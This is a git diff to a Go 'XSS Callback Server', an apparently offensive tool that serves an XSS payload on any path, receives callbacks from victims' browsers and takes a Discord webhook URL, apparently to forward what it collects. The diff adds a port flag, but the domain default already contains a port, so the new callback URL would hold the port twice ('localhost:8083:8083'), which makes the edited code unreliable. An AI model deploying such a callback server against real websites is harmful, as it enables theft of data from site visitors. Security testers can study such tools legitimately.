@@ -34,9 +34,11 @@ func main() {
 	var domain string
 	var webhookURL string
 	var verbose bool
+	var port int
 	flag.StringVar(&domain, "domain", "localhost:8083", "Domain for the callback URL (e.g., 0.0.0.0.nip.io:8083)")
 	flag.StringVar(&webhookURL, "webhook", "", "Discord webhook URL (required)")
 	flag.BoolVar(&verbose, "v", false, "Enable verbose logging")
+	flag.IntVar(&port, "p", 8083, "Port to run the server on (default 8083)")
 	flag.Parse()
 
 	// Validate required arguments
@@ -56,7 +58,7 @@ func main() {
 	}
 
 	// Replace the callback URL placeholder with our server's callback endpoint
-	callbackURL := fmt.Sprintf("http://%s/callback", domain)
+	callbackURL := fmt.Sprintf("http://%s:%d/callback", domain, port)
 	modifiedJS := strings.ReplaceAll(string(jsContent),
 		`"CALLBACK_URL_PLACEHOLDER"`,
 		callbackURL)
@@ -185,11 +187,9 @@ func main() {
 		w.Write([]byte("OK"))
 	})
 
-	port := ":8083"
-
 	// Always show startup information
 	fmt.Printf("🚀 XSS Callback Server Starting...\n")
-	fmt.Printf("📍 Port: %s\n", port)
+	fmt.Printf("📍 Port: %d\n", port)
 	fmt.Printf("🌐 Domain: %s\n", domain)
 	fmt.Printf("🔗 Callback URL: %s\n", callbackURL)
 	fmt.Printf("📡 XSS payload will be served on any path\n")
@@ -197,7 +197,7 @@ func main() {
 	fmt.Printf("🔕 Verbose logging: %t\n", verbose)
 	fmt.Printf("✅ Server ready!\n\n")
 
-	log.Fatal(http.ListenAndServe(port, nil))
+	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", port), nil))
 }
 
 func min(a, b int) int {
